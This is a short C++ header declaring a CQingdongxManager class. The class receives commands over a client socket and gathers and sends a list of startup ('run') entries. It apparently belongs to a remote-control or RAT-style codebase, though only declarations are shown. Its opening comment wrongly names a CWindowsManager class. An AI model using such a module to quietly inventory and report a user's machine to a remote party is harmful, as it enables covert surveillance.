// QingdongxManager.h: interface for the CWindowsManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_QIDONGXMANAGER_H__524BA78D_3978_4CBD_A236_21C52C2E97F0__INCLUDED_)
#define AFX_QIDONGXMANAGER_H__524BA78D_3978_4CBD_A236_21C52C2E97F0__INCLUDED_


#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include "../Contain/Manager.h"
class CQingdongxManager  : public CManager  
{
public:
	CQingdongxManager(CClientSocket *pClient);
	virtual ~CQingdongxManager();

	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);

	LPBYTE getRunList();
	void SendRunList();

};
#endif // !defined(AFX_QIDONGXMANAGER_H__524BA78D_3978_4CBD_A236_21C52C2E97F0__INCLUDED_)
